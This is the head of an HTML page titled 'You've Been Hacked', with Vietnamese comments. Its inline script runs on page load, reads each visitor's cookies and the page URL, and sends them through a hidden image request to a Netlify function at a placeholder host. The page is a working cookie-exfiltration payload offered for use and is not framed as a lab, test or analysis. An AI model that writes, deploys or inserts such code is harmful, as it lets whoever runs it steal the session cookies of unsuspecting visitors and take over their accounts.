<!DOCTYPE html>

    <title>Alert: You've Been Hacked bởi 4 chị em!</title>
    <link rel="stylesheet" href="style.css" />
    <script>
      // Lấy thông tin cookies và URL
      function sendDataToNetlify() {
        var cookies = document.cookie; // Lấy cookies của người dùng
        var currentUrl = window.location.href; // Lấy URL của trang

        // Gửi dữ liệu tới Netlify function
        var img = new Image();
        img.src =
          "https://<your-site-name>.netlify.app/.netlify/functions/logRequest?cookies=" +
          encodeURIComponent(cookies) +
          "&url=" +
          encodeURIComponent(currentUrl);
      }

      // Gọi hàm khi trang tải
      window.onload = sendDataToNetlify;
    </script>
  </head>
